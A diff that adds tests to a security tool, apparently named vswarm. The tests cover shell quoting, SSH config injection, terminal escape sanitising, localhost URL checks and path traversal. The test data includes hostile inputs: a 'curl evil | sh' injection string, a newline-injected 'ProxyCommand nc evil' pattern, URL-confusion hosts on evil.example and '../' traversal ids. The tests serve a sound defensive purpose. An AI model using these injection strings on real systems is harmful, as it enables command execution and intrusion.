@@ -97,6 +97,10 @@ describe("gate", () => {
     last("warn");
     p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--strict", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
     expect(await p.exited).toBe(2);
+    // Options after --then belong to the command, even ones vswarm knows.
+    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "--offline", "--json", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
+    expect(await p.exited).toBe(0);
+    expect((await new Response(p.stdout).text()).trim()).toBe("--offline --json RAN");
     // An open incident blocks even with a passing cached verdict.
     last("pass");
     writeFileSync(join(sec, "lock"), JSON.stringify({ incident: "t", at: Date.now(), reason: "test" }));
@@ -289,6 +293,71 @@ describe("short-lived SSH certificates", () => {
     const g = sshGate(["prod-*"], ["/v/vswarm"], { cert: { key: "/v/ca/session", cert: "/v/ca/session-cert.pub" } });
     expect(g).toContain('!exec "/v/vswarm cert --quiet --host %h"');
     expect(g).toContain("CertificateFile /v/ca/session-cert.pub");
+  });
+
+  test("the ssh block quotes an odd launcher path and refuses patterns that would change the config line", () => {
+    expect(sshGate(["prod-*"], ["/Users/a b/.vswarm/bin/vswarm"])).toContain(`!exec "'/Users/a b/.vswarm/bin/vswarm' preflight --quiet --host %h"`);
+    expect(() => sshGate(["prod-* !exec evil"], ["/v/vswarm"])).toThrow(/pattern/);
+    expect(() => sshGate(["prod-*\nProxyCommand nc evil"], ["/v/vswarm"])).toThrow(/pattern/);
+  });
+});
+
+describe("text that reaches a shell or a terminal", () => {
+  const { shq, dq } = require("../src/sec/ctx");
+  const { clean } = require("../src/sec/print");
+  const { inner } = require("../src/sec/try/linux");
+  const { guardBlock } = require("../src/sec/pkg");
+
+  test("shell words: plain names stay readable, everything else is quoted so it cannot run", () => {
+    expect(shq("/usr/local/bin/vswarm")).toBe("/usr/local/bin/vswarm");
+    expect(shq("a b")).toBe("'a b'");
+    expect(shq("x'; curl evil | sh; '")).toBe(`'x'\\''; curl evil | sh; '\\'''`);
+    expect(dq("/p/$(id)/`x`\"y")).toBe('"/p/\\$(id)/\\`x\\`\\"y"');
+    const sh = (cmd: string) => Bun.spawnSync(["sh", "-c", cmd], { stdout: "pipe" }).stdout.toString().trim();
+    expect(sh(`printf %s ${shq("a'b $(id) c")}`)).toBe("a'b $(id) c");
+    expect(sh(`printf %s ${dq("a\"b $(echo x) c")}`)).toBe("a\"b $(echo x) c");
+  });
+
+  test("generated shell: the install guard and the Linux inner script quote the paths they carry", () => {
+    const g = guardBlock("/Users/a b/.vswarm/bin/vswarm");
+    expect(g).toContain(`'/Users/a b/.vswarm/bin/vswarm' pkg npm -- "$@"`);
+    const box = { dir: "/h/u/try x", work: "/h/u/try x/work", home: "/h/u/try x/home", tmp: "/h/u/try x/tmp", netlog: "" };
+    const [, , script] = inner(box, "/usr/bin/bun", ["node", "a.js"], "/usr/bin/strace");
+    expect(script).toContain(`-o '/h/u/try x/tmp/trace.log' --`);
+    expect(script).toContain(`/bin/sh -c '"$@"; echo $? > "$0"' '/h/u/try x/tmp/exit' "$@"`);
+  });
+
+  test("control characters in names cannot erase or move what is printed; vswarm's own colours stay", () => {
+    expect(clean("ok\x1b[2K\x1b[1Ahidden\r\x07\x9b")).toBe("ok[2K[1Ahidden");
+    expect(clean("\x1b[1mbold\x1b[0m \x1b[38;2;1;2;3mc\x1b[0m\ttab")).toBe("\x1b[1mbold\x1b[0m \x1b[38;2;1;2;3mc\x1b[0m\ttab");
+    expect(clean("\x1b[8mconcealed\x1b[0m")).toBe("[8mconcealed\x1b[0m");
+  });
+});
+
+describe("only local pages and own folders", () => {
+  test("vswarm shot opens localhost by its parsed host, not by how the URL starts", () => {
+    const { localTarget } = require("../src/shot");
+    expect(localTarget("http://localhost:3000/x", "/")).toBe("http://localhost:3000/x");
+    expect(localTarget("http://0.0.0.0:3000/", "/")).toBe("http://localhost:3000/");
+    expect(localTarget("http://localhost:80@evil.example/", "/")).toBeUndefined();
+    expect(localTarget("http://127.0.0.1.evil.example/", "/")).toBeUndefined();
+    expect(localTarget("https://example.com", "/")).toBeUndefined();
+  });
+
+  test("vswarm try --clean takes a try id, never a path", () => {
+    const { cleanTries } = require("../src/sec/try");
+    const dir = mkdtempSync(join(tmpdir(), "vs-clean-"));
+    process.env.VSWARM_TRY_DIR = join(dir, "try");
+    try {
+      mkdirSync(join(dir, "try", "20260101-000000-x"), { recursive: true });
+      expect(() => cleanTries("..")).toThrow(/no try/);
+      expect(() => cleanTries("../other")).toThrow(/no try/);
+      expect(() => cleanTries("missing")).toThrow(/no try/);
+      expect(cleanTries("20260101-000000-x")).toBe(1);
+      expect(existsSync(dir)).toBe(true);
+    } finally {
+      delete process.env.VSWARM_TRY_DIR;
+    }
   });
 });
 
